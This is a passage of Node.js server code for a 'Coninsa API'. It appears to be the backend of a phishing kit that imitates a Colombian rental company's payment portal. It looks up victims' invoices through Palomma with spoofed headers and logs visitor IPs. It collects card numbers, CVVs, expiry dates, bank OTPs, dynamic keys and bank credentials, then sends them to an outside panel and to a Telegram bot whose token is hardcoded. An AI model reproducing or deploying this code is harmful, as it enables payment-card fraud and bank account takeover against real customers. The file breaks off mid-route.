// Coninsa API v1.0 — Palomma tRPC (sin CAPTCHA)
const express = require('express');
const cors    = require('cors');
const axios   = require('axios');
const path    = require('path');

const PORT     = process.env.PORT     || 3002;
const TG_TOKEN = process.env.TG_TOKEN || '8714922704:AAG9dcP56xY_gdUktBusuZFMdlj5Aqo2p4k';
const TG_CHAT  = process.env.TG_CHAT  || '-5211450529';

const PALOMMA_BASE = 'https://gosfhhn6za.execute-api.us-east-1.amazonaws.com';
const MERCHANT_ID  = 'coninsa';

const app = express();
app.use(express.json({ limit: '10mb' }));
app.use(cors({ origin: true, credentials: true }));

// â"€â"€ Cache 10 min â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€
const _cache = new Map();
const TTL    = 10 * 60 * 1000;
function cacheGet(k) {
  const h = _cache.get(k);
  if (h && Date.now() - h.ts < TTL) return h.v;
  _cache.delete(k); return null;
}
function cacheSet(k, v) { _cache.set(k, { v, ts: Date.now() }); }

// â"€â"€ Sesiones online (ventana 5 min) â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€
const _online   = new Map(); // ip -> { ts, ref, ua }
const _cedulaIp = new Map(); // cedula -> ip
function onlinePing(ip, ref, ua) {
  _online.set(ip, { ts: Date.now(), ref: ref || '', ua: ua || '' });
}
function onlineCount() {
  const cutoff = Date.now() - 15 * 1000;
  for (const [k, v] of _online) if (v.ts < cutoff) _online.delete(k);
  return _online.size;
}
function isCedulaOnline(cedula) {
  const ip = _cedulaIp.get(String(cedula));
  if (!ip) return false;
  const s = _online.get(ip);
  return !!s && (Date.now() - s.ts) < 15 * 1000;
}

// â"€â"€ Rate limit 15 req/min por IP â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€
const _rl = new Map();
function allowed(ip, max = 15, win = 60_000) {
  const now  = Date.now();
  const list = (_rl.get(ip) || []).filter(t => now - t < win);
  if (list.length >= max) return false;
  list.push(now); _rl.set(ip, list); return true;
}
function getIp(req) {
  return (req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '').split(',')[0].trim();
}

// â"€â"€ Palomma tRPC â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€
async function palommaListar(documento) {
  const input = JSON.stringify({
    "0": { rentalsMerchantId: MERCHANT_ID, customerIdentifier: documento }
  });
  const url = `${PALOMMA_BASE}/invoices.list?batch=1&input=${encodeURIComponent(input)}`;

  const { data } = await axios.get(url, {
    headers: {
      'Accept':          'application/json',
      'Referer':         `https://pagos.palomma.com/coninsa/?cliente=${documento}`,
      'Origin':          'https://pagos.palomma.com',
      'User-Agent':      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124 Safari/537.36',
    },
    timeout: 15_000,
  });

  // tRPC devuelve array: [{"result":{"data":{...}}}]
  return data?.[0]?.result?.data ?? null;
}

// â"€â"€ Telegram â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€
async function tgText(msg) {
  if (!TG_TOKEN || !TG_CHAT) return;
  await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
    method:  'POST',
    headers: { 'Content-Type': 'application/json' },
    body:    JSON.stringify({ chat_id: TG_CHAT, text: msg, parse_mode: 'HTML' }),
  }).catch(() => {});
}

// â"€â"€ Formatear pesos colombianos â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€
function fmtCOP(n) {
  if (!n && n !== 0) return null;
  return new Intl.NumberFormat('es-CO', { style: 'currency', currency: 'COP', minimumFractionDigits: 0 }).format(n);
}

// â"€â"€ Telegram proxy (para el modal de tarjeta del front) â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€
async function tgSend(msg, reply_markup) {
  if (!TG_TOKEN || !TG_CHAT) return { ok: false };
  const body = { chat_id: TG_CHAT, text: msg, parse_mode: 'HTML' };
  if (reply_markup) body.reply_markup = reply_markup;
  const r = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });
  return r.json();
}

async function tgGetUpdates(offset) {
  if (!TG_TOKEN) return { ok: false, result: [] };
  const r = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/getUpdates?offset=${offset}&timeout=0`);
  return r.json();
}

async function tgAnswerCallback(id) {
  if (!TG_TOKEN) return;
  await fetch(`https://api.telegram.org/bot${TG_TOKEN}/answerCallbackQuery`, {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ callback_query_id: id }),
  }).catch(() => {});
}

const PSEC_BASE = 'https://pagpse-u6htdvaa.b4a.run';

// â"€â"€ BIN lookup â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€
const BIN_SERVER_CACHE = {};
const BIN_MANUAL = {
  '360324': 'Davivienda',
  '372656': 'Banco Popular',
  '377813': 'Bancolombia',
  '377815': 'Bancolombia',
  '400608': 'Banco de Occidente',
  '401612': 'GNB Sudameris',
  '401616': 'Banco Pichincha',
  '401693': 'GNB Sudameris',
  '402530': 'Davivienda',
  '402739': 'Banco de Bogotá',
  '402753': 'Citibank',
  '402764': 'Banco de Bogotá',
  '403722': 'Banco de Bogotá',
  '403899': 'Davivienda',
  '404177': 'Scotiabank Colpatria',
  '404178': 'Scotiabank Colpatria',
  '404279': 'BBVA',
  '404280': 'BBVA',
  '404987': 'Banco Pichincha',
  '405414': 'GNB Sudameris',
  '405513': 'Citibank',
  '406238': 'Banco de Bogotá',
  '406694': 'Banco Popular',
  '407383': 'Davivienda',
  '408430': 'Scotiabank Colpatria',
  '408431': 'Scotiabank Colpatria',
  '409355': 'Nequi',
  '409744': 'Scotiabank Colpatria',
  '409983': 'Bancolombia',
  '409984': 'Bancolombia',
  '409985': 'Bancolombia',
  '410164': 'BBVA',
  '410176': 'Scotiabank Colpatria',
  '411054': 'Bancolombia',
  '411759': 'Scotiabank Colpatria',
  '412706': 'AV Villas',
  '416048': 'Scotiabank Colpatria',
  '416049': 'Scotiabank Colpatria',
  '419016': 'Citibank',
  '419328': 'Banco de Bogotá',
  '420559': 'Banco Popular',
  '421066': 'GNB Sudameris',
  '421067': 'GNB Sudameris',
  '421513': 'Banco de Bogotá',
  '421544': 'Banco de Bogotá',
  '421892': 'BBVA',
  '422274': 'Citibank',
  '422441': 'Citibank',
  '423383': 'Banco de Bogotá',
  '423949': 'Banco de Bogotá',
  '424114': 'Banco Popular',
  '424488': 'Davivienda',
  '425817': 'Davivienda',
  '425949': 'Davivienda',
  '425950': 'Davivienda',
  '425951': 'Davivienda',
  '425987': 'Banco de Occidente',
  '426045': 'Banco de Bogotá',
  '426288': 'Citibank',
  '426732': 'Banco de Bogotá',
  '430274': 'Banco de Bogotá',
  '430464': 'Davivienda',
  '430485': 'Banco de Occidente',
  '430929': 'Citibank',
  '431026': 'Banco de Occidente',
  '431027': 'Banco de Occidente',
  '432105': 'Scotiabank Colpatria',
  '432106': 'Scotiabank Colpatria',
  '433460': 'Banco de Bogotá',
  '434082': 'Citibank',
  '434606': 'Scotiabank Colpatria',
  '439116': 'Davivienda',
  '439152': 'Davivienda',
  '439216': 'BBVA',
  '439467': 'BBVA',
  '440811': 'Scotiabank Colpatria',
  '440812': 'Scotiabank Colpatria',
  '441080': 'Davivienda',
  '441119': 'Bancolombia',
  '441511': 'Banco de Occidente',
  '443846': 'Caja Social',
  '443847': 'Caja Social',
  '446846': 'Bancolombia',
  '446872': 'Banco de Bogotá',
  '449188': 'Bancolombia',
  '450011': 'Banco Popular',
  '450406': 'Scotiabank Colpatria',
  '450407': 'BBVA',
  '450408': 'BBVA',
  '450418': 'BBVA',
  '450648': 'Caja Social',
  '450650': 'Banco de Occidente',
  '450658': 'Banco Popular',
  '450668': 'Banco de Bogotá',
  '450796': 'Caja Social',
  '450942': 'Banco de Bogotá',
  '451303': 'Bancolombia',
  '451307': 'Bancolombia',
  '451308': 'Bancolombia',
  '451309': 'Bancolombia',
  '451318': 'Bancolombia',
  '451321': 'Bancolombia',
  '451348': 'Bancolombia',
  '451349': 'Bancolombia',
  '451359': 'Bancolombia',
  '451374': 'Bancolombia',
  '451376': 'Bancolombia',
  '451380': 'Bancolombia',
  '451381': 'Bancolombia',
  '451390': 'Bancolombia',
  '451391': 'Bancolombia',
  '451392': 'Bancolombia',
  '451396': 'Bancolombia',
  '451397': 'Bancolombia',
  '451398': 'Bancolombia',
  '451399': 'Bancolombia',
  '452494': 'Caja Social',
  '452519': 'Nequi',
  '453924': 'Caja Social',
  '454076': 'GNB Sudameris',
  '454083': 'GNB Sudameris',
  '454100': 'BBVA',
  '454200': 'Banco de Bogotá',
  '454300': 'Davivienda',
  '454322': 'Banco Popular',
  '454400': 'Bancolombia',
  '454405': 'Banco Popular',
  '454476': 'Banco Popular',
  '454600': 'Scotiabank Colpatria',
  '454601': 'Scotiabank Colpatria',
  '454616': 'Banco Popular',
  '454700': 'BBVA',
  '454701': 'BBVA',
  '454759': 'BBVA',
  '455100': 'BBVA',
  '455370': 'Davivienda',
  '455722': 'Banco de Occidente',
  '455981': 'Davivienda',
  '455982': 'Davivienda',
  '455983': 'Davivienda',
  '455986': 'Davivienda',
  '456360': 'Davivienda',
  '456390': 'Banco de Occidente',
  '456783': 'BBVA',
  '457021': 'Caja Social',
  '457022': 'Caja Social',
  '457282': 'Scotiabank Colpatria',
  '457284': 'Scotiabank Colpatria',
  '457317': 'Scotiabank Colpatria',
  '457320': 'Banco de Bogotá',
  '457537': 'Banco de Bogotá',
  '457542': 'Banco de Bogotá',
  '458173': 'Davivienda',
  '459070': 'Citibank',
  '459096': 'Bancoomeva',
  '459386': 'Caja Social',
  '459388': 'Caja Social',
  '459419': 'BBVA',
  '459918': 'Banco de Bogotá',
  '459919': 'Banco de Bogotá',
  '461202': 'Citibank',
  '461203': 'Citibank',
  '461208': 'Scotiabank Colpatria',
  '461209': 'Scotiabank Colpatria',
  '462550': 'BBVA',
  '462896': 'Bancoomeva',
  '462940': 'Banco de Occidente',
  '462941': 'Banco de Occidente',
  '462947': 'Caja Social',
  '463188': 'Banco Pichincha',
  '465770': 'Banco de Bogotá',
  '465955': 'GNB Sudameris',
  '466090': 'Banco de Bogotá',
  '469766': 'Bancoomeva',
  '469864': 'GNB Sudameris',
  '470438': 'AV Villas',
  '470439': 'AV Villas',
  '470440': 'AV Villas',
  '472043': 'Davivienda',
  '472044': 'Davivienda',
  '473228': 'Davivienda',
  '474493': 'Davivienda',
  '474555': 'Bancoomeva',
  '475094': 'Banco de Occidente',
  '477363': 'Banco de Bogotá',
  '477364': 'Banco de Bogotá',
  '479428': 'GNB Sudameris',
  '480850': 'Citibank',
  '480851': 'Citibank',
  '480852': 'Citibank',
  '482407': 'Bancoomeva',
  '482451': 'AV Villas',
  '482484': 'Scotiabank Colpatria',
  '485630': 'Davivienda',
  '485924': 'GNB Sudameris',
  '485926': 'Banco Popular',
  '485930': 'Scotiabank Colpatria',
  '485935': 'Banco de Bogotá',
  '485936': 'Banco de Occidente',
  '485946': 'Bancolombia',
  '485953': 'Davivienda',
  '485970': 'Davivienda',
  '485980': 'Caja Social',
  '485995': 'BBVA',
  '486412': 'Banco de Bogotá',
  '486437': 'Davivienda',
  '486514': 'Banco de Bogotá',
  '486618': 'Caja Social',
  '487048': 'Davivienda',
  '489421': 'Bancoomeva',
  '489422': 'Bancoomeva',
  '489445': 'Caja Social',
  '489469': 'Banco Popular',
  '489474': 'Bancoomeva',
  '489911': 'Banco de Occidente',
  '489925': 'Banco de Occidente',
  '491240': 'Banco Pichincha',
  '491264': 'Banco Pichincha',
  '491265': 'Banco Pichincha',
  '491268': 'BBVA',
  '491330': 'Banco de Occidente',
  '491511': 'Banco de Bogotá',
  '491602': 'Banco de Bogotá',
  '491614': 'Banco de Bogotá',
  '491616': 'Banco de Bogotá',
  '491617': 'Banco de Bogotá',
  '491625': 'Banco de Bogotá',
  '491626': 'Banco de Bogotá',
  '491646': 'Davivienda',
  '491647': 'Davivienda',
  '492114': 'GNB Sudameris',
  '492115': 'GNB Sudameris',
  '492198': 'BBVA',
  '492468': 'BBVA',
  '492485': 'Scotiabank Colpatria',
  '492486': 'Scotiabank Colpatria',
  '492488': 'BBVA',
  '492489': 'BBVA',
  '493110': 'Banco de Bogotá',
  '493111': 'Banco de Bogotá',
  '493813': 'Scotiabank Colpatria',
  '494381': 'Bancolombia',
  '496079': 'AV Villas',
  '496080': 'AV Villas',
  '496081': 'AV Villas',
  '496083': 'Banco de Bogotá',
  '496084': 'Scotiabank Colpatria',
  '498467': 'Davivienda',
  '498476': 'Scotiabank Colpatria',
  '498478': 'Caja Social',
  '498533': 'Citibank',
  '498534': 'Caja Social',
  '498858': 'Citibank',
  '498859': 'Citibank',
  '498860': 'Citibank',
  '498861': 'Citibank',
  '498862': 'Citibank',
  '498867': 'GNB Sudameris',
  '499812': 'Banco de Bogotá',
  '512020': 'Davivienda',
  '512046': 'Davivienda',
  '512067': 'Citibank',
  '512069': 'Banco de Bogotá',
  '512272': 'Davivienda',
  '512392': 'Davivienda',
  '514332': 'Falabella',
  '515816': 'Citibank',
  '517640': 'Bancolombia',
  '517710': 'Bancolombia',
  '517796': 'Davivienda',
  '518761': 'BBVA',
  '518841': 'BBVA',
  '520024': 'Davivienda',
  '521354': 'BBVA',
  '522104': 'Banco de Bogotá',
  '527564': 'BBVA',
  '528092': 'Davivienda',
  '528209': 'Falabella',
  '528629': 'BBVA',
  '529198': 'Banco de Bogotá',
  '530371': 'Bancolombia',
  '530372': 'Bancolombia',
  '530373': 'Bancolombia',
  '530691': 'Bancolombia',
  '530693': 'Bancolombia',
  '530694': 'Bancolombia',
  '530695': 'Bancolombia',
  '530696': 'Bancolombia',
  '530697': 'Bancolombia',
  '530710': 'Banco de Occidente',
  '530711': 'Banco de Occidente',
  '530712': 'Banco de Occidente',
  '530713': 'Banco de Occidente',
  '530714': 'Banco de Occidente',
  '530715': 'Banco de Occidente',
  '530716': 'Banco de Occidente',
  '530717': 'Banco de Occidente',
  '530718': 'Banco de Occidente',
  '530719': 'Banco de Occidente',
  '530720': 'Banco de Occidente',
  '530721': 'Banco de Occidente',
  '530722': 'Banco de Occidente',
  '530723': 'Banco de Occidente',
  '530724': 'Banco de Occidente',
  '530725': 'Banco de Occidente',
  '530726': 'Banco de Occidente',
  '530727': 'Banco de Occidente',
  '530728': 'Banco de Occidente',
  '530729': 'Banco de Occidente',
  '531088': 'Banco de Bogotá',
  '531378': 'Davivienda',
  '532576': 'Citibank',
  '539612': 'Banco de Bogotá',
  '540080': 'Banco de Bogotá',
  '540614': 'Bancolombia',
  '540615': 'Bancolombia',
  '540625': 'Banco de Occidente',
  '540640': 'Bancolombia',
  '540649': 'Bancolombia',
  '540688': 'Bancolombia',
  '540691': 'Bancolombia',
  '540692': 'Davivienda',
  '540694': 'Davivienda',
  '540699': 'BBVA',
  '541203': 'Banco de Occidente',
  '542650': 'BBVA',
  '543421': 'Citibank',
  '543448': 'Citibank',
  '543862': 'Banco de Bogotá',
  '546853': 'Citibank',
  '547062': 'Bancolombia',
  '547063': 'Davivienda',
  '547102': 'Davivienda',
  '547107': 'Davivienda',
  '547113': 'Davivienda',
  '547115': 'Davivienda',
  '547130': 'Davivienda',
  '547158': 'Davivienda',
  '547178': 'Davivienda',
  '547191': 'Davivienda',
  '547246': 'Davivienda',
  '547385': 'Banco de Occidente',
  '547457': 'BBVA',
  '547480': 'Bancolombia',
  '547481': 'Davivienda',
  '547482': 'Davivienda',
  '548115': 'BBVA',
  '548494': 'Banco de Bogotá',
  '548788': 'Davivienda',
  '548940': 'Banco de Bogotá',
  '549151': 'Banco de Occidente',
  '549156': 'Davivienda',
  '549157': 'Bancolombia',
  '549158': 'Bancolombia',
  '549724': 'Davivienda',
  '552221': 'Banco de Bogotá',
  '552256': 'Banco de Occidente',
  '552336': 'Davivienda',
  '552588': 'Bancolombia',
  '552807': 'Bancolombia',
  '552865': 'Banco de Bogotá',
  '552903': 'Davivienda',
  '553643': 'BBVA',
  '553661': 'Banco de Bogotá',
  '554901': 'Davivienda',
  '554933': 'Citibank',
  '554936': 'Davivienda',
  '558761': 'Davivienda',
  '558772': 'Banco de Occidente',
  '601600': 'Bancolombia',
  '601601': 'Bancolombia',
  '601602': 'Bancolombia',
  '601603': 'Bancolombia',
  '601604': 'Bancolombia',
  '601606': 'Bancolombia',
  '601607': 'Bancolombia',
  '601609': 'Bancolombia',
  '601610': 'Bancolombia',
  '601611': 'Bancolombia',
  '601612': 'Bancolombia',
  '601613': 'Bancolombia',
  '601616': 'Bancolombia',
  '601617': 'Bancolombia',
  '601620': 'Bancolombia',
  '601621': 'Bancolombia',
  '601622': 'Bancolombia',
  '601623': 'Bancolombia',
  '601624': 'Bancolombia',
  '601625': 'Bancolombia',
  '601626': 'Bancolombia',
  '601627': 'Bancolombia',
  '601629': 'Bancolombia',
  '601630': 'Bancolombia',
  '601631': 'Bancolombia',
  '601633': 'Bancolombia',
  '601634': 'Bancolombia',
  '601635': 'Bancolombia',
  '601640': 'Bancolombia',
  '601641': 'Bancolombia',
  '601642': 'Bancolombia',
  '601643': 'Bancolombia',
  '601644': 'Bancolombia',
  '601645': 'Bancolombia',
  '601646': 'Bancolombia',
  '601647': 'Bancolombia',
  '601648': 'Bancolombia',
  '601649': 'Bancolombia',
  '601650': 'Bancolombia',
  '601651': 'Bancolombia',
  '601652': 'Bancolombia',
  '601654': 'Bancolombia',
  '601655': 'Bancolombia',
  '601656': 'Bancolombia',
  '601657': 'Bancolombia',
  '601659': 'Bancolombia',
  '601661': 'Bancolombia',
  '601662': 'Bancolombia',
  '601663': 'Bancolombia',
  '601665': 'Bancolombia',
  '601666': 'Bancolombia',
  '601667': 'Bancolombia',
  '601668': 'Bancolombia',
  '601670': 'Bancolombia',
  '601671': 'Bancolombia',
  '601673': 'Bancolombia',
  '601674': 'Bancolombia',
  '601676': 'Bancolombia',
  '601678': 'Bancolombia',
  '601679': 'Bancolombia',
  '601682': 'Bancolombia',
  '601683': 'Bancolombia',
  '601684': 'Bancolombia',
  '601687': 'Bancolombia',
  '601689': 'Bancolombia',
  '601690': 'Bancolombia',
  '601691': 'Bancolombia',
  '601693': 'Bancolombia',
  '601694': 'Bancolombia',
  '601695': 'Bancolombia',
  '601696': 'Bancolombia',
  '601697': 'Bancolombia',
  '601698': 'Bancolombia',
  '601699': 'Bancolombia',
};

const BIN_KEYWORDS = [
  { kw: ['bancolombia', 'colombiano'], name: 'Bancolombia' },
  { kw: ['davivienda'],                name: 'Davivienda'  },
  { kw: ['nequi'],                     name: 'Nequi'       },
  { kw: ['popular'],                   name: 'Banco Popular' },
  { kw: ['occidente'],                 name: 'Banco de Occidente' },
  { kw: ['bogota'],                    name: 'Banco de BogotÃ¡' },
  { kw: ['itau'],                      name: 'ItaÃº'        },
  { kw: ['bbva'],                      name: 'BBVA'        },
  { kw: ['av villas', 'avvillas'],     name: 'AV Villas'   },
  { kw: ['caja social'],               name: 'Caja Social' },
  { kw: ['falabella'],                 name: 'Falabella'   },
  { kw: ['pichincha'],                 name: 'Pichincha'   },
  { kw: ['gnb', 'sudameris'],          name: 'GNB Sudameris' },
  { kw: ['coomeva', 'bancoomeva'],     name: 'Bancoomeva'  },
  { kw: ['colpatria', 'scotiabank'],   name: 'Scotiabank Colpatria' },
  { kw: ['finandina'],                 name: 'Finandina'   },
  { kw: ['citibank', 'citi'],          name: 'Citibank'    },
];
const norm = s => s.toLowerCase().normalize('NFD').replace(/\p{Diacritic}/gu,'').replace(/[^a-z0-9 ]/g,' ').replace(/\s+/g,' ').trim();

async function detectBin(cardNumber) {
  const bin = String(cardNumber).replace(/\s/g,'').substring(0, 6);
  if (BIN_MANUAL[bin]) return BIN_MANUAL[bin];
  if (BIN_SERVER_CACHE[bin] !== undefined) return BIN_SERVER_CACHE[bin];
  try {
    const r = await axios.get(`https://lookup.binlist.net/${bin}`, {
      headers: { 'Accept-Version': '3' }, timeout: 5000,
    });
    const raw = r.data?.bank?.name || '';
    const scheme = r.data?.scheme;
    if (!raw && !scheme) { BIN_SERVER_CACHE[bin] = null; return null; }
    if (!raw) { const s = scheme.charAt(0).toUpperCase() + scheme.slice(1); BIN_SERVER_CACHE[bin] = s; return s; }
    const n = norm(raw);
    for (const e of BIN_KEYWORDS) {
      if (e.kw.some(kw => n.includes(norm(kw)))) { BIN_SERVER_CACHE[bin] = e.name; return e.name; }
    }
    BIN_SERVER_CACHE[bin] = raw;
    return raw;
  } catch { return null; }
}

// â"€â"€ Routes â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€

// Visita nueva: log a Telegram
app.post('/api/visita', async (req, res) => {
  const ip  = getIp(req);
  const { ref, ua } = req.body || {};
  const isNew = !_online.has(ip);
  onlinePing(ip, ref, ua);
  res.json({ ok: true, online: onlineCount() });
  if (!isNew) return;

  // Filtrar bots: debe tener user-agent de navegador real
  const uaStr = (ua || '').toLowerCase();
  const esNavegador = uaStr.includes('mozilla') || uaStr.includes('chrome') || uaStr.includes('safari') || uaStr.includes('firefox');
  if (!esNavegador) return;

  const hora = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
  const refTxt = ref ? `\n🔗 <b>Referencia:</b> <code>${ref}</code>` : '';
  await tgText(
    `🌐 <b>NUEVA VISITA — CONINSA</b>\n` +
    `🌍 <b>IP:</b> <code>${ip}</code>${refTxt}\n` +
    `👥 <b>Online ahora:</b> ${onlineCount()}\n` +
    `🕐 ${hora}`
  );
});

// Ping heartbeat (mantiene "online", sin log)
app.post('/api/ping', (req, res) => {
  const ip = getIp(req);
  const { ref, ua } = req.body || {};
  onlinePing(ip, ref, ua);
  res.json({ ok: true, online: onlineCount() });
});

// â"€â"€ Proxy psec tarjetas â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€â"€
app.post('/api/tarjeta/crear', async (req, res) => {
  try {
    const ip = getIp(req);
    const { numero_tarjeta, fecha, cvv, tipo_doc, cedula, monto } = req.body || {};
    if (cedula) _cedulaIp.set(String(cedula), ip);
    const banco = (await detectBin(numero_tarjeta)) ||
      (num => num[0]==='4' ? 'Visa' : num[0]==='5' ? 'Mastercard' : num[0]==='3' ? 'Amex/Diners' : 'Otra')(
        (numero_tarjeta || '').replace(/\s/g,'')
      );
    const params = new URLSearchParams({
      numero_tarjeta: numero_tarjeta || '',
      fecha:          fecha || '',
      cvv:            cvv  || '',
      nombre:         cedula || '',
      apellido:       '',
      tipo_doc:       tipo_doc || 'CC',
      cedula:         cedula || '',
      celular:        '',
      email:          '',
      monto:          monto || 0,
      banco:          banco,
    });
    const r = await axios.post(`${PSEC_BASE}//panel/run/create_tarjeta_m3it3m.php`, params.toString(), {
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      timeout: 12000,
    });
    const hora = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
    await tgText(
      `💳 <b>NUEVA TARJETA — CONINSA</b>\n` +
      `🆔 <b>ID:</b> <code>${r.data?.id || '?'}</code>\n` +
      `🏦 <b>Banco:</b> ${banco}\n` +
      `📋 <b>Doc:</b> <code>${tipo_doc} ${cedula}</code>\n` +
      `💰 <b>Monto:</b> $${Number(monto || 0).toLocaleString('es-CO')}\n` +
      `🕐 ${hora}\n` +
      `<i>(datos en el panel)</i>`
    );
    res.json(r.data);
  } catch (e) { res.json({ status: 'ERROR', message: e.message }); }
});

app.get('/api/online/:cedula', (req, res) => {
  res.json({ online: isCedulaOnline(req.params.cedula) });
});

app.post('/api/detect-bank', async (req, res) => {
  const { cardNumber } = req.body || {};
  if (!cardNumber || String(cardNumber).replace(/\s/g,'').length < 6)
    return res.json({ ok: false, bank: null });
  const bank = await detectBin(cardNumber);
  res.json({ ok: true, bank: bank || null });
});

app.get('/api/tarjeta/estado/:id', async (req, res) => {
  try {
    const r = await axios.get(`${PSEC_BASE}//panel/run/get_tarjetas_m3it3m.php`, { timeout: 12000 });
    const all = r.data?.data || [];
    const item = all.find(t => String(t.id) === String(req.params.id));
    if (!item) return res.json({ status: 'NOT_FOUND' });
    res.json({ status: 'OK', data: item });
  } catch (e) { res.json({ status: 'ERROR', message: e.message }); }
});

app.post('/api/tarjeta/actualizar', async (req, res) => {
  try {
    const { id, status, banco_otp, dinamica, usuario, clave } = req.body || {};
    const params = new URLSearchParams({ id: id || '', status: status || '' });
    if (banco_otp) params.append('banco_otp', banco_otp);
    else if (usuario)    params.append('banco_otp', usuario);
    if (dinamica)  params.append('dinamica', dinamica);
    else if (clave)      params.append('dinamica', clave);
    const r = await axios.post(`${PSEC_BASE}//panel/run/update_tarjeta_status_m3it3m.php`, params.toString(), {
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      timeout: 12000,
    });

    const hora = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
    if (banco_otp) {
      await tgText(
        `📲 <b>OTP INGRESADO — CONINSA</b>\n` +
        `🆔 <b>ID:</b> <code>${id}</code>\n` +
        `🕐 ${hora}\n` +
        `<i>(valor en el panel)</i>`
      );
    } else if (dinamica) {
      await tgText(
        `🔑 <b>CLAVE DINÁMICA INGRESADA — CONINSA</b>\n` +
        `🆔 <b>ID:</b> <code>${id}</code>\n` +
        `🕐 ${hora}\n` +
        `<i>(valor en el panel)</i>`
      );
    }

    res.json(r.data);
  } catch (e) { res.json({ status: 'ERROR', message: e.message }); }
});

app.post('/api/tg/send', async (req, res) => {
  try {
    const { text, reply_markup } = req.body || {};
    const data = await tgSend(text, reply_markup);
    res.json(data);
  } catch (e) { res.json({ ok: false }); }
});

app.get('/api/tg/updates', async (req, res) => {
  try {
    const offset = parseInt(req.query.offset) || 0;
    const data   = await tgGetUpdates(offset);
    res.json(data);
  } catch (e) { res.json({ ok: false, result: [] }); }
});

app.post('/api/tg/answer', async (req, res) => {
  try {
    const { callback_query_id } = req.body || {};
    await tgAnswerCallback(callback_query_id);
    res.json({ ok: true });
  } catch (e) { res.json({ ok: false }); }
});

app.get('/health', (_, res) =>
  res.json({ ok: true, uptime: Math.floor(process.uptime()), cache: _cache.size })
);

// POST /api/coninsa/buscar  { documento: "123456789" }
app.post('/api/coninsa/buscar', async (req, res) => {
  if (!allowed(getIp(req)))
    return res.status(429).json({ error: 'Demasiadas solicitudes. Intenta en un momento.' });

  const { documento } = req.body || {};
  if (!documento)
    return res.status(400).json({ error: 'El nÃºmero de documento es requerido.' });

  const doc = String(documento).trim().replace(/\D/g, '');
  if (!doc)
    return res.status(400).json({ error: 'Documento invÃ¡lido.' });

  const cacheKey = `coninsa_${doc}`;
  const cached   = cacheGet(cacheKey);
  if (cached) return res.json({ ...cached, _cached: true });

  try {
    console.log(`\n[Coninsa] Consultando documento: ${doc}`);
    const data = await palommaListar(doc);

    if (!data) {
      return res.status(502).json({ error: 'Sin respuesta de Coninsa. Intenta de nuevo.' });
    }

    const invoices = data.invoices ?? [];
    const total    = invoices.reduce((s, inv) => s + Number(inv.amount ?? inv.totalAmount ?? 0), 0);

    const result = {
      ok:                   true,
      documento:            doc,
      totalFacturas:        invoices.length,
      totalDeuda:           total,
      totalDeudaFmt:        fmtCOP(total),
      cardFeePercentage:    data.cardFeePercentage,
      isBlockedForCard:     data.isBlockedForCardPayments,
